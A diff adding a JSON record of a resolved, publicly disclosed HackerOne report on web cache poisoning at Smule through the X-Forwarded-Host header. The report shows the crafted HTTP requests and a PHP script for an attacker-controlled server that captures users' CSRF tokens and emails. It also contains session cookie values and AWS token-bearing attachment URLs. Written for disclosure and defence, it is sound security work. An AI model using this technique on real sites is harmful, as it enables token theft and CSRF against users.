@@ -1,0 +1,138 @@
+{
+  "id": 504514,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDQ1MTQ=",
+  "url": "https://hackerone.com/reports/504514",
+  "title": "Web cache poisoning leads to disclosure of CSRF token and sensitive information",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-03T17:17:52.679Z",
+  "submitted_at": "2019-03-03T17:17:52.679Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3f4u17",
+    "url": "/d3f4u17",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23970,
+    "url": "https://hackerone.com/smule",
+    "handle": "smule",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/970/86155a522b43459fc587e2ff56745e1f531e823e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/970/86155a522b43459fc587e2ff56745e1f531e823e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Smule",
+      "twitter_handle": "smule",
+      "website": "https://www.smule.com",
+      "about": "Smule is making music social, interactive, and collaborative again. "
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-07-21T06:17:59.380Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-06-21T06:17:59.222Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \n\nThe page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) is vulnerable to web cache poisoning.\n\n**Description:**\n\nThe page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) is vulnerable to web cache poisoning, on adding `X-Forwarded-Host` header to the request multiple request links get change which leads a user to make requests to a third party website.\n\n## Steps To Reproduce:\n\n*  Intercept the request to the following page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) using burp suite or any other tool.\n\n```\nGET /s/smule_groups/user_groups/fossnow27 HTTP/1.1\nHost: www.smule.com\nX-Forwarded-Host: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794; smule_cookie_banner_disabled=true; _ga=GA1.2.1744768224.1551586925; _gid=GA1.2.2071077738.1551586925; L=N; _smule_web_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJTY4Nzc0ZDQxYjdiYmEyYTlmNmRkZTk3NjYwYmRlMDBkBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmSkdDZk9XcGhHajc5dXFHd1FYc1NhUnh0eGtjVHBocG1Sb3RubldlNDg9BjsARg%3D%3D--4ea860dfb2e3ad2a5a3d49c058f35485961ac5d3; cookies.js=1; smule_autoplay={%22enabled%22:true}; py={%22globalVolume%22:true%2C%22volume%22:0.5}; connection_info=eyJjb3VudHJ5IjoiSU4iLCJob21lUG9wIjoic2ciLCJjb250ZW50UHJveHkiOiJ0YyJ9--16206c9d48aa7c70227255756cc5a9e1e43d3cab\nConnection: close\nUpgrade-Insecure-Requests: 1\nIf-None-Match: W/\"74107fb6dcc410390f339e5ddabc3022\"\nCache-Control: max-age=0\n\n```\nIn the above request I have added X-Forwarded-Host header.\n\n* The response returned is shown below, changing the action links as well as footer links of the page.\n{F434734}\n\n*  Now open the response, and try to login, when you will login following request will be made\n> If you will refresh the page it will ask for resubmission as it is a type of revalidate type of caching.\n\n```\nPOST /user/check_email HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.smule.com/s/smule_groups/user_groups/fossnow27\nX-CSRF-Token: █████████=\nContent-Type: application/x-www-form-urlencoded\nX-Smulen: daf446d26def7faeef4f6527d7f20fae\nContent-Length: 31\nOrigin: https://www.smule.com\nConnection: close\n\nemail=foo%40bar.com\t\n```\nto mimic the reponse of the actual server response I have written the following script\n\n```php\n<?php\nif($_SERVER['REQUEST_METHOD'] == \"OPTIONS\"){\n    if($_SERVER['HTTP_ORIGIN'] == \"https://www.smule.com\"){\n        header('Access-Control-Allow-Origin: *');\n        header('Access-Control-Allow-Methods: POST, GET, OPTIONS');\n        header('Access-Control-Allow-Headers: x-csrf-token,x-smulen');\n        header('Access-Control-Max-Age: 1728000');\n        header(\"Content-Length: 0\");\n        header(\"Content-Type: text/plain\");\n        exit;\n    }\n    else{\n        header(\"HTTP/1.1 403 Access Forbidden\");\n        header(\"Content-Type: text/plain\");\n        echo \"You cannot repeat this request\";\n    }\n}\n\nelse if($_SERVER[\"REQUEST_METHOD\"] == \"POST\"){\n\theader(\"Content-type: application/json; charset=utf-8\");\n\theader(\"Cache-Control: max-age=0, private, must-revalidate\");\n\theader(\"Content-Security-Policy: default-src * data: blob:; frame-ancestors *.smule.com; script-src 'unsafe-inline' 'unsafe-eval' blob: https://boards.greenhouse.io/embed/job_board/js https://js.stripe.com/v2/ https://js.stripe.com/v3/ http://*.smule.com:* http://*.facebook.net http://*.google-analytics.com http://*.google.com http://*.googleapis.com http://*.gstatic.com https://*.smule.com:* https://*.facebook.net https://*.accountkit.com https://*.google-analytics.com https://*.google.com https://*.googleapis.com https://*.gstatic.com http://www.apple.com/library/quicktime/scripts/ac_quicktime.js https://www.apple.com/library/quicktime/scripts/ac_quicktime.js platform.twitter.com https://optimize.google.com; style-src 'unsafe-inline' data: http://*.smule.com:* https://*.smule.com:* yui.yahooapis.com https://optimize.google.com https://fonts.googleapis.com; report-uri /s/csp-log;\");\n\theader(\"X-Frame-Options: SAMEORIGIN\");\n\theader(\"Set-Cookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794;domain=.smule.com; path=/; expires=Fri, 01-Jan-2038 08:00:00 GMT\");\n\theader(\"ETag: W/\\\"5be24db7cb9adabbe965c1850ce0de98\\\"\");\n\theader(\"X-Request-Id: 9c67b0a57e77660dacbefea12085f82f\");\n\t$res = array(\"email\"=>true, \"token\" => $_SERVER[\"HTTP_X_CSRF_TOKEN\"], \"mail\" => $_POST['email']);\n\techo json_encode($res);\n}\n?>\n```\nThe request/respone is shown below:\n\n{F434739}\n\n## Impact:\n\n* CSRF attacks.\n* Sensitive Information leakage. \n\n## Supporting Material/References:\n\n* [https://www.owasp.org/index.php/Cache_Poisoning](https://www.owasp.org/index.php/Cache_Poisoning)\n* [https://portswigger.net/blog/practical-web-cache-poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)\n\n## Impact\n\n* CSRF attacks\n* Information disclosure",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 434734,
+      "file_name": "smulewebcache.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/734/dc7afc2df357da5904ab01edfc20b90337e8a9e4/smulewebcache.png?response-content-disposition=attachment%3B%20filename%3D%22smulewebcache.png%22%3B%20filename%2A%3DUTF-8%27%27smulewebcache.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ564LXW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131841Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDl76KVUFS0hN8YruFStxJXVErBlHnUq37TLzE6NJ4nVgIhANpbiTp%2BMBG4Nwb5E7dtwmMEX5oh%2FQf%2BDE1tYHw3IkRRKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5IgysR5bYjXDNHPUxaW8qjwUn5sVCnmMuonjKnG%2FT4J4WQrTsBQX1SNmTEPNbtsQv5XcKQaoPHieXQdr%2B%2B1X5avNpXfOZbh0pZ6CXdrJ4yYa55f0HXkeQiH0zcQ0fif5j1pP8jC%2Blsq%2BD9fB7SzZQg6RmosBSYA4XGzLy8%2FPyGRLQ28yjB4W8KTl8fBM4CmJJFWLBmzWUBK2SOnDwMfsDL5%2BmafcYaKkz0yszM1cg3XozTAFLh8hmoIUAWpu77QkIzg0Ht8%2B93fM%2FYsZn5uKr6IpQ2U4pqWdLfB29cuQ%2Fcqg62XxGu%2BLk6jR1jXWEegWhMonWqQeGJPWbh8kEDYxBzUAidK12bSQGyMxonksvquoUumwsvEUzmQd%2BhHIBPGEfHEpImOlgzqswJwZ%2F4JNoWjfIUk3c2lvDijlThqGBqTQoB645h%2B4iprdRTJwkrRB74qIwzHH8cv8viZ7ZrieVZK6heyAtoEGA%2BZN6Yt1%2Fh3uEHlmtJnS1Vmef8OPs7HDSzKz4njXcD7iXOt625xzMEBsfshpisEQDc6V%2BgE%2BBXbdv%2FT4XaJkVUN7kUFRWxoez0R%2FafT55iChRzC%2FCCCtXPxRwQLswXHFkjSKPv6sVfuM5MRTBUP55DDIHcRMXtwEjecS03yT%2BLa3gpqGgU9vRMfcH0LWQdYklhl1sQ6N1w3UJ%2BzTVF7HEgKCpghOKhwVCK9huxD72fxZOO6FF5FJzK3DifWVeM1v32dnnKItdegNY3N8My9s4MQJ%2B3ECyboRUjyg2nm%2BDhuYrpgIelJVrUGgu74IzyiQ2A%2FCKjoDOYFSWGrm4y%2B2UnhJeZRlQds%2FlnTD4xuiMof7htaNeiZuyDqfi6JTbOSG%2FNqB7QSE2ezcJ75qQGAqDpKeqbVdeTC34MIa2ra4GOrABDubMC6LwabfeW3Qsfz2RgL7fTEyxJw929PcIhksJK3EmRE2rUVVoVGGm7fTwmneEB55wcJn7xtg4Rs3f5YiKxBbRlxeqJEXHdJJWWaOq%2BpG%2BMHzVFgbZYimMKoU39IYu2PyQrofnOmHZ%2FEB3I1PLguFv1fjZlzVTHUwnD4kRx2g5tTJLggeCKerD5uXmMSsk8WllCOp%2FdA8M69%2BsXGmqNNPZRG6tkFF%2FJPssbKNyXTU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0502134dd2e8644234933548b2b9d339a200435c4afbefbaee3363ebc7d7727b",
+      "file_size": 55568,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 434739,
+      "file_name": "smulewebcache3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/739/563f87438d324986afb4dc686f4e6e004e8e0df1/smulewebcache3.png?response-content-disposition=attachment%3B%20filename%3D%22smulewebcache3.png%22%3B%20filename%2A%3DUTF-8%27%27smulewebcache3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ564LXW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131841Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDl76KVUFS0hN8YruFStxJXVErBlHnUq37TLzE6NJ4nVgIhANpbiTp%2BMBG4Nwb5E7dtwmMEX5oh%2FQf%2BDE1tYHw3IkRRKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5IgysR5bYjXDNHPUxaW8qjwUn5sVCnmMuonjKnG%2FT4J4WQrTsBQX1SNmTEPNbtsQv5XcKQaoPHieXQdr%2B%2B1X5avNpXfOZbh0pZ6CXdrJ4yYa55f0HXkeQiH0zcQ0fif5j1pP8jC%2Blsq%2BD9fB7SzZQg6RmosBSYA4XGzLy8%2FPyGRLQ28yjB4W8KTl8fBM4CmJJFWLBmzWUBK2SOnDwMfsDL5%2BmafcYaKkz0yszM1cg3XozTAFLh8hmoIUAWpu77QkIzg0Ht8%2B93fM%2FYsZn5uKr6IpQ2U4pqWdLfB29cuQ%2Fcqg62XxGu%2BLk6jR1jXWEegWhMonWqQeGJPWbh8kEDYxBzUAidK12bSQGyMxonksvquoUumwsvEUzmQd%2BhHIBPGEfHEpImOlgzqswJwZ%2F4JNoWjfIUk3c2lvDijlThqGBqTQoB645h%2B4iprdRTJwkrRB74qIwzHH8cv8viZ7ZrieVZK6heyAtoEGA%2BZN6Yt1%2Fh3uEHlmtJnS1Vmef8OPs7HDSzKz4njXcD7iXOt625xzMEBsfshpisEQDc6V%2BgE%2BBXbdv%2FT4XaJkVUN7kUFRWxoez0R%2FafT55iChRzC%2FCCCtXPxRwQLswXHFkjSKPv6sVfuM5MRTBUP55DDIHcRMXtwEjecS03yT%2BLa3gpqGgU9vRMfcH0LWQdYklhl1sQ6N1w3UJ%2BzTVF7HEgKCpghOKhwVCK9huxD72fxZOO6FF5FJzK3DifWVeM1v32dnnKItdegNY3N8My9s4MQJ%2B3ECyboRUjyg2nm%2BDhuYrpgIelJVrUGgu74IzyiQ2A%2FCKjoDOYFSWGrm4y%2B2UnhJeZRlQds%2FlnTD4xuiMof7htaNeiZuyDqfi6JTbOSG%2FNqB7QSE2ezcJ75qQGAqDpKeqbVdeTC34MIa2ra4GOrABDubMC6LwabfeW3Qsfz2RgL7fTEyxJw929PcIhksJK3EmRE2rUVVoVGGm7fTwmneEB55wcJn7xtg4Rs3f5YiKxBbRlxeqJEXHdJJWWaOq%2BpG%2BMHzVFgbZYimMKoU39IYu2PyQrofnOmHZ%2FEB3I1PLguFv1fjZlzVTHUwnD4kRx2g5tTJLggeCKerD5uXmMSsk8WllCOp%2FdA8M69%2BsXGmqNNPZRG6tkFF%2FJPssbKNyXTU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c0f8a391f66958f591940a8efb16ae52ea66378ecb87f8e759501b0657d352b1",
+      "file_size": 93905,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-07-21T06:17:59.271Z",
+  "allow_singular_disclosure_after": -144140442.1828547,
+  "singular_disclosure_allowed": true,
+  "vote_count": 35,
+  "voters": [
+    "th3hidd3nmist",
+    "mashoud1122",
+    "base_64",
+    "spam404",
+    "ali",
+    "dhakal_ananda",
+    "mik317",
+    "jpdev",
+    "d3f4u17",
+    "tulswani",
+    "and 25 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 8863,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.smule.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
